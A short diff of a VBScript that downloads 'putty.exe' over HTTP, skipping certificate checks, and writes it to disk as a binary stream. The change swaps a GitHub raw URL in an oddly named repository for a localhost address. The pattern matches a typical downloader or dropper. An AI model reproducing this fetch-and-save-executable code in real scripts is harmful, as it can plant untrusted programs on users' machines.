@@ -18,7 +18,7 @@
 			Dim http,ado
 			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
 			http.SetOption 2, 13056
-			http.open "GET","https://github.com/c0mp4s5/java/raw/master/putty.exe",False
+			http.open "GET","http://127.0.0.1/putty.exe",False
 			http.send
 			Set ado = createobject("Adodb.Stream")
 			ado.Type = adTypeBinary
